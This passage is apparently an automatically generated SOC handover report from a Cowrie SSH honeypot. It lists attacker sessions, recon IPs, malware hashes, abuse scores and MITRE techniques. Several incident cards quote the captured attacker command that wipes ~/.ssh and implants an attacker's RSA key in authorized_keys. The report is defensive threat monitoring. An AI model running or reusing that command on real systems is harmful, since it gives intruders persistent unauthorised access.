| `2026-05-22 14:33:38` | `cowrie.command.failed` |
| `2026-05-22 14:33:38` | `cowrie.log.closed` |
| `2026-05-22 14:33:38` | `cowrie.session.params` |
| `2026-05-22 14:33:38` | `cowrie.command.input` |
| `2026-05-22 14:33:38` | `cowrie.session.file_download` |
| `2026-05-22 14:33:38` | `cowrie.log.closed` |
| `2026-05-22 14:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-872551094906

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-22 14:33 |
| **Last Seen** | 2026-05-22 14:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:33:40` | `cowrie.session.connect` |
| `2026-05-22 14:33:40` | `cowrie.client.version` |
| `2026-05-22 14:33:40` | `cowrie.client.kex` |
| `2026-05-22 14:33:40` | `cowrie.login.success` |
| `2026-05-22 14:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f3a49a867b9

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 14:44 |
| **Last Seen** | 2026-05-22 14:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:44:13` | `cowrie.session.connect` |
| `2026-05-22 14:44:13` | `cowrie.client.version` |
| `2026-05-22 14:44:13` | `cowrie.client.kex` |
| `2026-05-22 14:44:15` | `cowrie.login.success` |
| `2026-05-22 14:44:15` | `cowrie.session.params` |
| `2026-05-22 14:44:15` | `cowrie.command.input` |
| `2026-05-22 14:44:15` | `cowrie.command.failed` |
| `2026-05-22 14:44:16` | `cowrie.log.closed` |
| `2026-05-22 14:44:16` | `cowrie.session.params` |
| `2026-05-22 14:44:16` | `cowrie.command.input` |
| `2026-05-22 14:44:17` | `cowrie.session.file_download` |
| `2026-05-22 14:44:17` | `cowrie.log.closed` |
| `2026-05-22 14:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ba9d18f8360

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 14:44 |
| **Last Seen** | 2026-05-22 14:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:44:21` | `cowrie.session.connect` |
| `2026-05-22 14:44:21` | `cowrie.client.version` |
| `2026-05-22 14:44:21` | `cowrie.client.kex` |
| `2026-05-22 14:44:22` | `cowrie.login.success` |
| `2026-05-22 14:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbbcaec4c4f7

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-22 14:45 |
| **Last Seen** | 2026-05-22 14:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:45:04` | `cowrie.session.connect` |
| `2026-05-22 14:45:04` | `cowrie.client.version` |
| `2026-05-22 14:45:04` | `cowrie.client.kex` |
| `2026-05-22 14:45:04` | `cowrie.login.success` |
| `2026-05-22 14:45:05` | `cowrie.session.params` |
| `2026-05-22 14:45:05` | `cowrie.command.input` |
| `2026-05-22 14:45:05` | `cowrie.command.failed` |
| `2026-05-22 14:45:05` | `cowrie.log.closed` |
| `2026-05-22 14:45:05` | `cowrie.session.params` |
| `2026-05-22 14:45:05` | `cowrie.command.input` |
| `2026-05-22 14:45:05` | `cowrie.session.file_download` |
| `2026-05-22 14:45:05` | `cowrie.log.closed` |
| `2026-05-22 14:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ffd642a4af8

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-22 14:45 |
| **Last Seen** | 2026-05-22 14:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:45:07` | `cowrie.session.connect` |
| `2026-05-22 14:45:07` | `cowrie.client.version` |
| `2026-05-22 14:45:07` | `cowrie.client.kex` |
| `2026-05-22 14:45:07` | `cowrie.login.success` |
| `2026-05-22 14:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `102.88.137[.]80` | **15** | 2026-05-22 13:40 | 2026-05-22 14:07 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.105[.]165` | **13** | 2026-05-22 13:06 | 2026-05-22 13:22 | 17m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.108[.]213` | **9** | 2026-05-22 10:55 | 2026-05-22 11:27 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `101.36.106[.]162` | **7** | 2026-05-22 14:21 | 2026-05-22 14:45 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `186.103.169[.]12` | **3** | 2026-05-22 14:34 | 2026-05-22 14:44 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `192.169.152[.]102` | **3** | 2026-05-22 11:29 | 2026-05-22 11:57 | 1m | 0 | `T1592` | 🟢 LOW |
| `90.79.20[.]201` | **3** | 2026-05-22 10:54 | 2026-05-22 11:00 | 6m | 0 | `T1592` | 🟢 LOW |
| `16.58.56[.]214` | **2** | 2026-05-22 13:22 | 2026-05-22 13:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.184.43[.]90` | **2** | 2026-05-22 12:10 | 2026-05-22 12:12 | 4m | 0 | `T1592` | 🟢 LOW |
| `183.87.217[.]222` | **2** | 2026-05-22 13:13 | 2026-05-22 13:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.38.149[.]131` | **2** | 2026-05-22 10:58 | 2026-05-22 10:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `95.71.127[.]158` | **2** | 2026-05-22 12:27 | 2026-05-22 13:50 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `1.214.179[.]202` | 1 | 2026-05-22 11:08 | 2026-05-22 11:08 | 30s | 0 | `T1592` | 🟢 LOW |
| `101.126.18[.]30` | 1 | 2026-05-22 13:39 | 2026-05-22 13:39 | 8s | 0 | `T1592` | 🟢 LOW |
| `101.96.199[.]69` | 1 | 2026-05-22 11:38 | 2026-05-22 11:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.218.89[.]110` | 1 | 2026-05-22 12:27 | 2026-05-22 12:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.137.40[.]250` | 1 | 2026-05-22 12:20 | 2026-05-22 12:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.220.238[.]224` | 1 | 2026-05-22 12:27 | 2026-05-22 12:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.166[.]75` | 1 | 2026-05-22 12:44 | 2026-05-22 12:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.246[.]44` | 1 | 2026-05-22 14:32 | 2026-05-22 14:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.22[.]11` | 1 | 2026-05-22 12:38 | 2026-05-22 12:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.11[.]36` | 1 | 2026-05-22 12:08 | 2026-05-22 12:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.42[.]17` | 1 | 2026-05-22 13:40 | 2026-05-22 13:40 | 27s | 0 | `T1592` | 🟢 LOW |
| `129.146.181[.]168` | 1 | 2026-05-22 14:39 | 2026-05-22 14:40 | 32s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]32` | 1 | 2026-05-22 13:49 | 2026-05-22 13:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `140.249.200[.]169` | 1 | 2026-05-22 14:09 | 2026-05-22 14:09 | 37s | 0 | `T1592` | 🟢 LOW |
| `155.4.244[.]107` | 1 | 2026-05-22 12:19 | 2026-05-22 12:19 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.105[.]69` | 1 | 2026-05-22 12:23 | 2026-05-22 12:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.137[.]24` | 1 | 2026-05-22 14:01 | 2026-05-22 14:02 | 6s | 0 | `T1592` | 🟢 LOW |
| `180.76.170[.]111` | 1 | 2026-05-22 11:30 | 2026-05-22 11:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.233.91[.]154` | 1 | 2026-05-22 13:17 | 2026-05-22 13:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.107.254[.]110` | 1 | 2026-05-22 12:22 | 2026-05-22 12:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.87.201[.]131` | 1 | 2026-05-22 12:57 | 2026-05-22 12:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `42.81.126[.]27` | 1 | 2026-05-22 11:05 | 2026-05-22 11:05 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.224.126[.]107` | 1 | 2026-05-22 11:50 | 2026-05-22 11:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.17.99[.]102` | 1 | 2026-05-22 12:03 | 2026-05-22 12:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.49.239[.]11` | 1 | 2026-05-22 12:13 | 2026-05-22 12:13 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `46.17.99[.]102` | NL | HOSTKEY B.V. | **100** ⚠️ | 2 |
| `49.49.239[.]11` | TH | Triple T Broadband Public Company Limited | **100** ⚠️ | 2 |
| `120.48.11[.]36` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `180.184.43[.]90` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 13 |
| `218.157.205[.]238` | KR | Korea Telecom | **100** ⚠️ | 43 |
| `129.146.181[.]168` | US | Oracle Corporation | **100** ⚠️ | 7 |
| `118.145.246[.]44` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 7 |
| `120.48.42[.]17` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `113.137.40[.]250` | CN | CHINANET SHAANXI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `1.214.179[.]202` | KR | LG Uplus | **100** ⚠️ | 35 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 116 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 54 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 45 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 23 |

---

## 🔕 False Positive Summary (40 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 25 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 173 cases |
| Tool 34  | Credential Extractor        | ✅ 99 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 45 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 40 filtered (23.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 45 priority case(s) shown individually · 37 recon entry/entries in table (12 group(s) consolidating 63 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-22T14:47:10Z_
